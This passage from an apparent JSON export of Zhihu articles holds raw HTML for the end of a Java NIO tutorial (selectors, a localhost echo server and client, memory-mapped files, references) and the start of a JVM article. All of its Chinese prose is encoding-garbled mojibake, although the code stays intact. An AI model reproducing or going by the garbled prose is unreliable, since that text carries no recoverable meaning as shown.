class=\"kc\">false</span><span class=\"o\">);</span>\n<span class=\"n\">ssChannel</span><span class=\"o\">.</span><span class=\"na\">register</span><span class=\"o\">(</span><span class=\"n\">selector</span><span class=\"o\">,</span> <span class=\"n\">SelectionKey</span><span class=\"o\">.</span><span class=\"na\">OP_ACCEPT</span><span class=\"o\">);</span></code></pre></div><p>é€šé“å¿…é¡»é…ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼Œå¦åˆ™ä½¿ç”¨é€‰æ‹©å™¨å°±æ²¡æœ‰ä»»ä½•æ„ä¹‰äº†ï¼Œå› ä¸ºå¦‚æœé€šé“åœ¨æŸä¸ªäº‹ä»¶ä¸Šè¢«é˜»å¡ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¸èƒ½å“åº”å…¶å®ƒäº‹ä»¶ï¼Œå¿…é¡»ç­‰å¾…è¿™ä¸ªäº‹ä»¶å¤„ç†å®Œæ¯•æ‰èƒ½å»å¤„ç†å…¶å®ƒäº‹ä»¶ï¼Œæ˜¾ç„¶è¿™å’Œé€‰æ‹©å™¨çš„ä½œç”¨èƒŒé“è€Œé©°ã€‚</p><p>åœ¨å°†é€šé“æ³¨å†Œåˆ°é€‰æ‹©å™¨ä¸Šæ—¶ï¼Œè¿˜éœ€è¦æŒ‡å®šè¦æ³¨å†Œçš„å…·ä½“äº‹ä»¶ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li>SelectionKey.OP_CONNECT</li><li>SelectionKey.OP_ACCEPT</li><li>SelectionKey.OP_READ</li><li>SelectionKey.OP_WRITE</li></ul><p>å®ƒä»¬åœ¨ SelectionKey çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">OP_READ</span> <span class=\"o\">=</span> <span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">OP_WRITE</span> <span class=\"o\">=</span> <span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">OP_CONNECT</span> <span class=\"o\">=</span> <span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">3</span><span class=\"o\">;</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">OP_ACCEPT</span> <span class=\"o\">=</span> <span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">4</span><span class=\"o\">;</span></code></pre></div><p>å¯ä»¥çœ‹å‡ºæ¯ä¸ªäº‹ä»¶å¯ä»¥è¢«å½“æˆä¸€ä¸ªä½åŸŸï¼Œä»è€Œç»„æˆäº‹ä»¶é›†æ•´æ•°ã€‚ä¾‹å¦‚ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">int</span> <span class=\"n\">interestSet</span> <span class=\"o\">=</span> <span class=\"n\">SelectionKey</span><span class=\"o\">.</span><span class=\"na\">OP_READ</span> <span class=\"o\">|</span> <span class=\"n\">SelectionKey</span><span class=\"o\">.</span><span class=\"na\">OP_WRITE</span><span class=\"o\">;</span></code></pre></div><h3>3. ç›‘å¬äº‹ä»¶</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">=</span> <span class=\"n\">selector</span><span class=\"o\">.</span><span class=\"na\">select</span><span class=\"o\">();</span></code></pre></div><p>ä½¿ç”¨ select() æ¥ç›‘å¬åˆ°è¾¾çš„äº‹ä»¶ï¼Œå®ƒä¼šä¸€ç›´é˜»å¡ç›´åˆ°æœ‰è‡³å°‘ä¸€ä¸ªäº‹ä»¶åˆ°è¾¾ã€‚</p><h3>4. è·å–åˆ°è¾¾çš„äº‹ä»¶</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Set</span><span class=\"o\">&lt;</span><span class=\"n\">SelectionKey</span><span class=\"o\">&gt;</span> <span class=\"n\">keys</span> <span class=\"o\">=</span> <span class=\"n\">selector</span><span class=\"o\">.</span><span class=\"na\">selectedKeys</span><span class=\"o\">();</span>\n<span class=\"n\">Iterator</span><span class=\"o\">&lt;</span><span class=\"n\">SelectionKey</span><span class=\"o\">&gt;</span> <span class=\"n\">keyIterator</span> <span class=\"o\">=</span> <span class=\"n\">keys</span><span class=\"o\">.</span><span class=\"na\">iterator</span><span class=\"o\">();</span>\n<span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">hasNext</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n    <span class=\"n\">SelectionKey</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">();</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">isAcceptable</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">isReadable</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n    <span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h3>5. äº‹ä»¶å¾ªç¯</h3><p>å› ä¸ºä¸€æ¬¡ select() è°ƒç”¨ä¸èƒ½å¤„ç†å®Œæ‰€æœ‰çš„äº‹ä»¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨ç«¯æœ‰å¯èƒ½éœ€è¦ä¸€ç›´ç›‘å¬äº‹ä»¶ï¼Œå› æ­¤æœåŠ¡å™¨ç«¯å¤„ç†äº‹ä»¶çš„ä»£ç ä¸€èˆ¬ä¼šæ”¾åœ¨ä¸€ä¸ªæ­»å¾ªç¯å†…ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">=</span> <span class=\"n\">selector</span><span class=\"o\">.</span><span class=\"na\">select</span><span class=\"o\">();</span>\n    <span class=\"n\">Set</span><span class=\"o\">&lt;</span><span class=\"n\">SelectionKey</span><span class=\"o\">&gt;</span> <span class=\"n\">keys</span> <span class=\"o\">=</span> <span class=\"n\">selector</span><span class=\"o\">.</span><span class=\"na\">selectedKeys</span><span class=\"o\">();</span>\n    <span class=\"n\">Iterator</span><span class=\"o\">&lt;</span><span class=\"n\">SelectionKey</span><span class=\"o\">&gt;</span> <span class=\"n\">keyIterator</span> <span class=\"o\">=</span> <span class=\"n\">keys</span><span class=\"o\">.</span><span class=\"na\">iterator</span><span class=\"o\">();</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">hasNext</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"n\">SelectionKey</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">();</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">isAcceptable</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">isReadable</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// ...\n</span><span class=\"c1\"></span>        <span class=\"o\">}</span>\n        <span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¥—æ¥å­— NIO å®ä¾‹</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">NIOServer</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n\n        <span class=\"n\">Selector</span> <span class=\"n\">selector</span> <span class=\"o\">=</span> <span class=\"n\">Selector</span><span class=\"o\">.</span><span class=\"na\">open</span><span class=\"o\">();</span>\n\n        <span class=\"n\">ServerSocketChannel</span> <span class=\"n\">ssChannel</span> <span class=\"o\">=</span> <span class=\"n\">ServerSocketChannel</span><span class=\"o\">.</span><span class=\"na\">open</span><span class=\"o\">();</span>\n        <span class=\"n\">ssChannel</span><span class=\"o\">.</span><span class=\"na\">configureBlocking</span><span class=\"o\">(</span><span class=\"kc\">false</span><span class=\"o\">);</span>\n        <span class=\"n\">ssChannel</span><span class=\"o\">.</span><span class=\"na\">register</span><span class=\"o\">(</span><span class=\"n\">selector</span><span class=\"o\">,</span> <span class=\"n\">SelectionKey</span><span class=\"o\">.</span><span class=\"na\">OP_ACCEPT</span><span class=\"o\">);</span>\n\n        <span class=\"n\">ServerSocket</span> <span class=\"n\">serverSocket</span> <span class=\"o\">=</span> <span class=\"n\">ssChannel</span><span class=\"o\">.</span><span class=\"na\">socket</span><span class=\"o\">();</span>\n        <span class=\"n\">InetSocketAddress</span> <span class=\"n\">address</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">InetSocketAddress</span><span class=\"o\">(</span><span class=\"s\">&#34;127.0.0.1&#34;</span><span class=\"o\">,</span> <span class=\"n\">8888</span><span class=\"o\">);</span>\n        <span class=\"n\">serverSocket</span><span class=\"o\">.</span><span class=\"na\">bind</span><span class=\"o\">(</span><span class=\"n\">address</span><span class=\"o\">);</span>\n\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n            <span class=\"n\">selector</span><span class=\"o\">.</span><span class=\"na\">select</span><span class=\"o\">();</span>\n            <span class=\"n\">Set</span><span class=\"o\">&lt;</span><span class=\"n\">SelectionKey</span><span class=\"o\">&gt;</span> <span class=\"n\">keys</span> <span class=\"o\">=</span> <span class=\"n\">selector</span><span class=\"o\">.</span><span class=\"na\">selectedKeys</span><span class=\"o\">();</span>\n            <span class=\"n\">Iterator</span><span class=\"o\">&lt;</span><span class=\"n\">SelectionKey</span><span class=\"o\">&gt;</span> <span class=\"n\">keyIterator</span> <span class=\"o\">=</span> <span class=\"n\">keys</span><span class=\"o\">.</span><span class=\"na\">iterator</span><span class=\"o\">();</span>\n\n            <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">hasNext</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n\n                <span class=\"n\">SelectionKey</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">();</span>\n\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">isAcceptable</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n\n                    <span class=\"n\">ServerSocketChannel</span> <span class=\"n\">ssChannel1</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">ServerSocketChannel</span><span class=\"o\">)</span> <span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">channel</span><span class=\"o\">();</span>\n\n                    <span class=\"c1\">// æœåŠ¡å™¨ä¼šä¸ºæ¯ä¸ªæ–°è¿æ¥åˆ›å»ºä¸€ä¸ª SocketChannel\n</span><span class=\"c1\"></span>                    <span class=\"n\">SocketChannel</span> <span class=\"n\">sChannel</span> <span class=\"o\">=</span> <span class=\"n\">ssChannel1</span><span class=\"o\">.</span><span class=\"na\">accept</span><span class=\"o\">();</span>\n                    <span class=\"n\">sChannel</span><span class=\"o\">.</span><span class=\"na\">configureBlocking</span><span class=\"o\">(</span><span class=\"kc\">false</span><span class=\"o\">);</span>\n\n                    <span class=\"c1\">// è¿™ä¸ªæ–°è¿æ¥ä¸»è¦ç”¨äºä»å®¢æˆ·ç«¯è¯»å–æ•°æ®\n</span><span class=\"c1\"></span>                    <span class=\"n\">sChannel</span><span class=\"o\">.</span><span class=\"na\">register</span><span class=\"o\">(</span><span class=\"n\">selector</span><span class=\"o\">,</span> <span class=\"n\">SelectionKey</span><span class=\"o\">.</span><span class=\"na\">OP_READ</span><span class=\"o\">);</span>\n\n                <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">isReadable</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n\n                    <span class=\"n\">SocketChannel</span> <span class=\"n\">sChannel</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">SocketChannel</span><span class=\"o\">)</span> <span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">channel</span><span class=\"o\">();</span>\n                    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">readDataFromSocketChannel</span><span class=\"o\">(</span><span class=\"n\">sChannel</span><span class=\"o\">));</span>\n                    <span class=\"n\">sChannel</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n                <span class=\"o\">}</span>\n\n                <span class=\"n\">keyIterator</span><span class=\"o\">.</span><span class=\"na\">remove</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"n\">String</span> <span class=\"nf\">readDataFromSocketChannel</span><span class=\"o\">(</span><span class=\"n\">SocketChannel</span> <span class=\"n\">sChannel</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n\n        <span class=\"n\">ByteBuffer</span> <span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"n\">ByteBuffer</span><span class=\"o\">.</span><span class=\"na\">allocate</span><span class=\"o\">(</span><span class=\"n\">1024</span><span class=\"o\">);</span>\n        <span class=\"n\">StringBuilder</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">StringBuilder</span><span class=\"o\">();</span>\n\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n            <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">clear</span><span class=\"o\">();</span>\n            <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">sChannel</span><span class=\"o\">.</span><span class=\"na\">read</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">);</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"k\">break</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">flip</span><span class=\"o\">();</span>\n            <span class=\"kt\">int</span> <span class=\"n\">limit</span> <span class=\"o\">=</span> <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">limit</span><span class=\"o\">();</span>\n            <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">dst</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">char</span><span class=\"o\">[</span><span class=\"n\">limit</span><span class=\"o\">];</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">limit</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n                <span class=\"n\">dst</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">)</span> <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"n\">dst</span><span class=\"o\">);</span>\n            <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">clear</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">NIOClient</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n        <span class=\"n\">Socket</span> <span class=\"n\">socket</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Socket</span><span class=\"o\">(</span><span class=\"s\">&#34;127.0.0.1&#34;</span><span class=\"o\">,</span> <span class=\"n\">8888</span><span class=\"o\">);</span>\n        <span class=\"n\">OutputStream</span> <span class=\"n\">out</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"o\">.</span><span class=\"na\">getOutputStream</span><span class=\"o\">();</span>\n        <span class=\"n\">String</span> <span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"s\">&#34;hello world&#34;</span><span class=\"o\">;</span>\n        <span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">write</span><span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">getBytes</span><span class=\"o\">());</span>\n        <span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>å†…å­˜æ˜ å°„æ–‡ä»¶</h2><p>å†…å­˜æ˜ å°„æ–‡ä»¶ I/O æ˜¯ä¸€ç§è¯»å’Œå†™æ–‡ä»¶æ•°æ®çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥æ¯”å¸¸è§„çš„åŸºäºæµæˆ–è€…åŸºäºé€šé“çš„ I/O å¿«å¾—å¤šã€‚</p><p>å‘å†…å­˜æ˜ å°„æ–‡ä»¶å†™å…¥å¯èƒ½æ˜¯å±é™©çš„ï¼Œåªæ˜¯æ”¹å˜æ•°ç»„çš„å•ä¸ªå…ƒç´ è¿™æ ·çš„ç®€å•æ“ä½œï¼Œå°±å¯èƒ½ä¼šç›´æ¥ä¿®æ”¹ç£ç›˜ä¸Šçš„æ–‡ä»¶ã€‚ä¿®æ”¹æ•°æ®ä¸å°†æ•°æ®ä¿å­˜åˆ°ç£ç›˜æ˜¯æ²¡æœ‰åˆ†å¼€çš„ã€‚</p><p>ä¸‹é¢ä»£ç è¡Œå°†æ–‡ä»¶çš„å‰ 1024 ä¸ªå­—èŠ‚æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œmap() æ–¹æ³•è¿”å›ä¸€ä¸ª MappedByteBufferï¼Œå®ƒæ˜¯ ByteBuffer çš„å­ç±»ã€‚å› æ­¤ï¼Œå¯ä»¥åƒä½¿ç”¨å…¶ä»–ä»»ä½• ByteBuffer ä¸€æ ·ä½¿ç”¨æ–°æ˜ å°„çš„ç¼“å†²åŒºï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨éœ€è¦æ—¶è´Ÿè´£æ‰§è¡Œæ˜ å°„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">MappedByteBuffer</span> <span class=\"n\">mbb</span> <span class=\"o\">=</span> <span class=\"n\">fc</span><span class=\"o\">.</span><span class=\"na\">map</span><span class=\"o\">(</span><span class=\"n\">FileChannel</span><span class=\"o\">.</span><span class=\"na\">MapMode</span><span class=\"o\">.</span><span class=\"na\">READ_WRITE</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">1024</span><span class=\"o\">);</span></code></pre></div><h2>å¯¹æ¯”</h2><p>NIO ä¸æ™®é€š I/O çš„åŒºåˆ«ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>NIO æ˜¯éé˜»å¡çš„ï¼›</li><li>NIO é¢å‘å—ï¼ŒI/O é¢å‘æµã€‚</li></ul><h2>å…«ã€å‚è€ƒèµ„æ–™</h2><ul><li>Eckel B, åŸƒå…‹å°”, æ˜Šé¹, ç­‰. Java ç¼–ç¨‹æ€æƒ³ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/education/java/j-nio/j-nio.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">IBM: NIO å…¥é—¨</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//tutorials.jenkov.com/java-nio/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java NIO Tutorial</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/nio.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java NIO æµ…æ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/j-lo-javaio/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">IBM: æ·±å…¥åˆ†æ Java I/O çš„å·¥ä½œæœºåˆ¶</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/j-lo-chinesecoding/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">IBM: æ·±å…¥åˆ†æ Java ä¸­çš„ä¸­æ–‡ç¼–ç é—®é¢˜</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/j-lo-serial/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">IBM: Java åºåˆ—åŒ–çš„é«˜çº§è®¤è¯†</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.csdn.net/shimiso/article/details/24990499\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NIO ä¸ä¼ ç»Ÿ IO çš„åŒºåˆ«</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//stg-tud.github.io/sedc/Lecture/ws13-14/5.3-Decorator.html%23mode%3Ddocument\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Decorator Design Pattern</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//labojava.blogspot.com/2012/12/socket-multicast.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Socket Multicast</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "Java", 
                    "tagLink": "https://api.zhihu.com/topics/19561132"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68499946", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "Java è™šæ‹Ÿæœº", 
            "content": "<p></p><p>æœ¬æ–‡å¤§éƒ¨åˆ†å†…å®¹å‚è€ƒ  <b>å‘¨å¿—æ˜ã€Šæ·±å…¥ç†è§£ Java è™šæ‹Ÿæœºã€‹</b> ï¼Œæƒ³è¦æ·±å…¥å­¦ä¹ çš„è¯è¯·çœ‹åŸä¹¦ã€‚</p><h2>ä¸€ã€è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-0268349386d5c1e492b454460ff03e2d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"1029\" class=\"origin_image zh-lightbox-thumb\" width=\"733\" data-original=\"https://pic2.zhimg.com/v2-0268349386d5c1e492b454460ff03e2d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;733&#39; height=&#39;1029&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"1029\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"733\" data-original=\"https://pic2.zhimg.com/v2-0268349386d5c1e492b454460ff03e2d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-0268349386d5c1e492b454460ff03e2d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ç¨‹åºè®¡æ•°å™¨</h2><p>è®°å½•æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ï¼ˆå¦‚æœæ­£åœ¨æ‰§è¡Œçš„æ˜¯æœ¬åœ°æ–¹æ³•åˆ™ä¸ºç©ºï¼‰ã€‚</p><h2>Java è™šæ‹Ÿæœºæ ˆ</h2><p>æ¯ä¸ª Java æ–¹æ³•åœ¨æ‰§è¡Œçš„åŒæ—¶ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€å¸¸é‡æ± å¼•ç”¨ç­‰ä¿¡æ¯ã€‚ä»æ–¹æ³•è°ƒç”¨ç›´è‡³æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œå¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨ Java è™šæ‹Ÿæœºæ ˆä¸­å…¥æ ˆå’Œå‡ºæ ˆçš„è¿‡ç¨‹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-a81e9e5f899ad7efe6fdcd175b6f72f9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"786\" data-rawheight=\"478\" class=\"origin_image zh-lightbox-thumb\" width=\"786\" data-original=\"https://pic2.zhimg.com/v2-a81e9e5f899ad7efe6fdcd175b6f72f9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;786&#39; height=&#39;478&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"786\" data-rawheight=\"478\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"786\" data-original=\"https://pic2.zhimg.com/v2-a81e9e5f899ad7efe6fdcd175b6f72f9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-a81e9e5f899ad7efe6fdcd175b6f72f9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å¯ä»¥é€šè¿‡ -Xss è¿™ä¸ªè™šæ‹Ÿæœºå‚æ•°æ¥æŒ‡å®šæ¯ä¸ªçº¿ç¨‹çš„ Java è™šæ‹Ÿæœºæ ˆå†…å­˜å¤§å°ï¼Œåœ¨ JDK 1.4 